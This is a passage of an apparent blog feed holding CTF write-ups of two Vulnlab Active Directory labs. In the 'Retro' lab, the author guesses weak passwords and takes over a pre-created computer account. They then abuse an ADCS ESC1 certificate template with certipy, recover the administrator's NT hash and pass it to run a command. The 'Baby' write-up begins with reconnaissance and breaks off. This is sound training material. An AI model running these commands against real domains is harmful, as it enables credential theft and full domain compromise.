SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.64.243    445    DC               [+] retro.vl\trainee:trainee
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And I’ve got a hit for the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;trainee&lt;/code&gt;. Now let’s try to get the SMB shares once again with that user.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u trainee -p trainee --shares
SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.64.243    445    DC               [+] retro.vl\trainee:trainee 
SMB         10.10.64.243    445    DC               [*] Enumerated shares
SMB         10.10.64.243    445    DC               Share           Permissions     Remark
SMB         10.10.64.243    445    DC               -----           -----------     ------
SMB         10.10.64.243    445    DC               ADMIN$                          Remote Admin
SMB         10.10.64.243    445    DC               C$                              Default share
SMB         10.10.64.243    445    DC               IPC$            READ            Remote IPC
SMB         10.10.64.243    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.64.243    445    DC               Notes           READ            
SMB         10.10.64.243    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.64.243    445    DC               Trainees        READ  
syl@sylsec:~/vulnlab/Retro$ smbclient //retro.vl/Notes -U &apos;trainee&apos;                                   
Password for [WORKGROUP\trainee]: trainee
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Mon Jul 24 01:03:16 2023
  ..                                DHS        0  Wed Jul 26 12:54:14 2023
  ToDo.txt                            A      248  Mon Jul 24 01:05:56 2023

                6261499 blocks of size 4096. 2179053 blocks available
smb: \&amp;gt; get Todo.txt
getting file \Todo.txt of size 248 as Todo.txt (1,5 KiloBytes/sec) (average 1,5 KiloBytes/sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I got a file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Todo.txt&lt;/code&gt; lets take a look:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This text file hints that there is some ancient banking software and some pre-created computer account, judging by that I can safely assume that they are talking about the account &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BANKING$&lt;/code&gt;, I tried onec again some weak credentials like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$BANKING:banking&lt;/code&gt; and I got this result:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u BANKING$ -p &apos;banking&apos;
SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.64.243    445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The result I got is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT&lt;/code&gt; which means that the password is correct! (REF: https://trustedsec.com/blog/diving-into-pre-created-computer-accounts)
But I cannot use this account until the password is changed, so lets do that. There is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;changepasswd.py&lt;/code&gt; by Impacket (https://github.com/fortra/impacket/blob/master/examples/changepasswd.py) which I can use to change the password via RPC, the thing that I need is another user, which I already have (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;trainee&lt;/code&gt;). There are other methods to change the password like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kpasswd&lt;/code&gt; as well.&lt;/p&gt;

&lt;h2 id=&quot;change-the-password-via-rpc-imapckets-changepasswdpy-method-1&quot;&gt;Change the password via RPC (imapcket’s changepasswd.py) Method #1&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(impacket-env) syl@sylsec:~/tools/impacket/examples$ python changepasswd.py retro.vl/&apos;BANKING$&apos;:&apos;banking&apos;@10.10.64.243 -altuser trainee -altpass trainee
Impacket v0.12.0.dev1+20230921.20754.9c8f344b - Copyright 2023 Fortra

New password: 
Retype new password: Summer2018!
[!] Attempting to *change* the password of retro.vl/BANKING$ as retro.vl/trainee. You may want to use &apos;-reset&apos; to *reset* the password of the target.
[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\trainee
[*] Password was changed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;using-kpasswd-method-2&quot;&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kpasswd&lt;/code&gt; Method #2&lt;/h2&gt;

&lt;p&gt;I can go with the LDAP way of chaning the password using the binary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kpasswd&lt;/code&gt; and since this is uncommon on Linux you can install it with:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/tools/$ sudo apt install krb5-user
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then you have to edit the realms in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/krb5.conf&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nn&quot;&gt;[libdefaults]&lt;/span&gt;
        &lt;span class=&quot;py&quot;&gt;default_realm&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;RETRO.VL&lt;/span&gt;
        &lt;span class=&quot;py&quot;&gt;dns_lookup_realm&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;false&lt;/span&gt;
        &lt;span class=&quot;py&quot;&gt;ticket_lifetime&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;24h&lt;/span&gt;
        &lt;span class=&quot;py&quot;&gt;renew_lifetime&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7d&lt;/span&gt;
        &lt;span class=&quot;py&quot;&gt;rdns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;false&lt;/span&gt;
        &lt;span class=&quot;py&quot;&gt;kdc_timesync&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
        &lt;span class=&quot;py&quot;&gt;ccache_type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;4&lt;/span&gt;
        &lt;span class=&quot;py&quot;&gt;forwardable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
        &lt;span class=&quot;py&quot;&gt;proxiable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;

&lt;span class=&quot;nn&quot;&gt;[realms]&lt;/span&gt;
        &lt;span class=&quot;py&quot;&gt;RETRO.VL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;py&quot;&gt;kdc&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;DC.RETRO.VL&lt;/span&gt;
                &lt;span class=&quot;py&quot;&gt;admin_server&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;DC.RETRO.VL&lt;/span&gt;
        &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nn&quot;&gt;[domain_realm]&lt;/span&gt;
        &lt;span class=&quot;py&quot;&gt;.retro.vl&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;RETRO.VL&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And then simply invoke &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kpasswd&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ sudo kpasswd BANKING$
Password for BANKING$@RETRO.VL: 
Enter new password: 
Enter it again: 
Password changed.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And now we can use this account!&lt;/p&gt;

&lt;p&gt;Lets enumerate the ADCS (Active Directory Certificate Services). I used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;certipy&lt;/code&gt; for that matter.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ certipy find -u trainee -p &apos;trainee&apos; -dc-ip 10.10.113.62 -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for &apos;retro-DC-CA&apos; via CSRA
[!] Got error while trying to get CA configuration for &apos;retro-DC-CA&apos; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for &apos;retro-DC-CA&apos; via RRP
[*] Got CA configuration for &apos;retro-DC-CA&apos;
[*] Saved BloodHound data to &apos;20231219202428_Certipy.zip&apos;. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to &apos;20231219202428_Certipy.txt&apos;
[*] Saved JSON output to &apos;20231219202428_Certipy.json&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looking at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;20231219202428_Certipy.txt&lt;/code&gt; we can see a ESC1 vunlerability related to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RetroClients&lt;/code&gt; certificate.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/&quot;&gt;More about ESC1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Looking at the permissions of the certificate template we notice that it can be used only by:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;RETRO.VL\Domain Admins&lt;/li&gt;
  &lt;li&gt;RETRO.VL\Enterprise Admins&lt;/li&gt;
  &lt;li&gt;RETRO.VL\Domain Computers&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I believe that the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BANKING$&lt;/code&gt; is within those groups so lets see:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ bloodhoundpy -dc retro.vl -u trainee -p trainee -d retro.vl
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
INFO: Connecting to LDAP server: retro.vl
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Found 7 users
INFO: Connecting to LDAP server: retro.vl
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 53 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: DC.retro.vl
INFO: Done in 00M 04S
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then I can query the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BANKING$&lt;/code&gt; and I can see its &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;First Degree Group Membership&lt;/code&gt; that this user is part of the group &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DOMAIN COMPUTERS&lt;/code&gt;, so we can use that user to exploit the certificate and retrieve the NTLM hash of the administrator.&lt;/p&gt;

&lt;p&gt;Lets retrieve the private key:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ certipy req -u &apos;BANKING$&apos; -p &apos;Summer2018!&apos; -dc-ip &apos;10.10.64.243&apos; -target &apos;dc.retro.vl&apos; -ca &apos;retro-DC-CA&apos; -template &apos;RetroClients&apos; -upn &apos;administrator&apos; -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 13
[*] Got certificate with UPN &apos;administrator&apos;
[*] Certificate has no object SID
[*] Saved certificate and private key to &apos;administrator.pfx&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;unpac-the-hash-method-1&quot;&gt;UnPAC the hash Method #1&lt;/h1&gt;

&lt;p&gt;We can use the technique UnPAC the hash to get the NTLM hash using the &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/dirkjanm/PKINITtools&quot;&gt;PKINITtools&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;First we need to retrieve the TGT and the AS-REP encryption key.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro/temp$ gettgtpkinit -cert-pfx ../exfiltrated/administrator.pfx -dc-ip 10.10.113.62 retro.vl/administrator ../exfiltrated/administrator.ccache 
2023-12-19 20:53:00,328 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2023-12-19 20:53:00,802 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2023-12-19 20:53:00,889 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2023-12-19 20:53:00,889 minikerberos INFO     23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec
INFO:minikerberos:23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec
2023-12-19 20:53:00,895 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getnthash.py&lt;/code&gt; to retrieve the NTLM hash.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro/exfiltrated$  getnthash retro.vl/administrator -key 23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec   
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
25....&amp;lt;hash&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;using-certipy-method-2&quot;&gt;Using Certipy Method #2&lt;/h1&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ certipy auth -pfx ./exfiltrated/administrator.pfx -dc-ip &apos;10.10.64.243&apos; -username &apos;administrator&apos; -domain retro.vl
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to &apos;administrator.ccache&apos;
[*] Trying to retrieve NT hash for &apos;administrator&apos;
[*] Got hash for &apos;administrator@retro.vl&apos;: aad3b435b51404eeaad3b435b51404ee:25&amp;lt;hash&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we can use that that hash for PTH (Pass the hash) attack.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u administrator -H 25&amp;lt;hash&amp;gt; -x &quot;cmd /c type C:\Users\Administrator\Desktop\root.txt&quot;
SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.64.243    445    DC               [+] retro.vl\administrator:25&amp;lt;hash&amp;gt; (Pwn3d!)
SMB         10.10.64.243    445    DC               [+] Executed command via wmiexec
SMB         10.10.64.243    445    DC               VL{&amp;lt;hash&amp;gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">Retro is an easy windows (active directory) machine by Vulnlab.</summary></entry><entry><title type="html">Vulnlab - Baby [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/12/18/vulnlab-baby.html" rel="alternate" type="text/html" title="Vulnlab - Baby [Easy]" /><published>2023-12-18T00:00:00+02:00</published><updated>2023-12-18T00:00:00+02:00</updated><id>http://localhost:4000/ctf-writeup/2023/12/18/vulnlab-baby</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/12/18/vulnlab-baby.html">&lt;p&gt;Recently I’ve started to explore more platforms for hacking different type of boxes and I found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xct&lt;/code&gt; has created &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vulnlab&lt;/code&gt;. From what I’ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the “Baby” lab.&lt;/p&gt;

&lt;p&gt;https://www.vulnlab.com/&lt;/p&gt;

&lt;h1 id=&quot;user--initial-foothold&quot;&gt;User / Initial Foothold&lt;/h1&gt;

&lt;p&gt;Started with a nmap scan:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; 4 &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; vuln&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap.txt &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    &lt;span class=&quot;nb&quot;&gt;bind
&lt;/span&gt;135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: baby.vl0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49664/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
59647/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.80%I&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;12/17%Time&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;657F4FC2%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DNS
SF:VersionBindReqTCP,20,&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0\0\0\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;07version
SF:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04bind&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;03&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
Service Info: Host: BABYDC&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can clearly see that this is a Windows machine that is also a part of Active Directory. The domain seems to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;baby.vl&lt;/code&gt;, I will add this to my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file. After that, I ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enum4linux&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;(I will post only the interesting results)&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;enum4linux &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Trying LDAP
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Appears to be root/parent DC
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Long domain name is: baby.vl
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Found domain information via SMB
NetBIOS computer name: BABYDC
NetBIOS domain name: BABY
DNS domain: baby.vl
FQDN: BabyDC.baby.vl
Derived membership: domain member
Derived domain: BABY
...
Server allows session using username &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;, password &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain: BABY
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain SID: S-1-5-21-1407081343-4001094062-1444647654
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Membership: domain member
...
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: &lt;span class=&quot;s1&quot;&gt;&apos;10.0&apos;&lt;/span&gt;
OS release: &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;
OS build: &lt;span class=&quot;s1&quot;&gt;&apos;20348&apos;&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This scan yieled some useful results like the computer name and some information about the system, usually I would try enumerate some more with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-LLL&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; ldap://&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; base &lt;span class=&quot;s1&quot;&gt;&apos;(objectclass=*)&apos;&lt;/span&gt;
...
rootDomainNamingContext: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;baby,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;vl
ldapServiceName: baby.vl:babydc&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;BABY.VL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This didn’t yield that much information but we can search for the specific domain components (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;baby,vl&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;(Only the interesting information)&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sylsec&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; ldap://&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DC=baby,DC=vl&quot;&lt;/span&gt;
...
&lt;span class=&quot;c&quot;&gt;# Teresa Bell, it, baby.vl&lt;/span&gt;
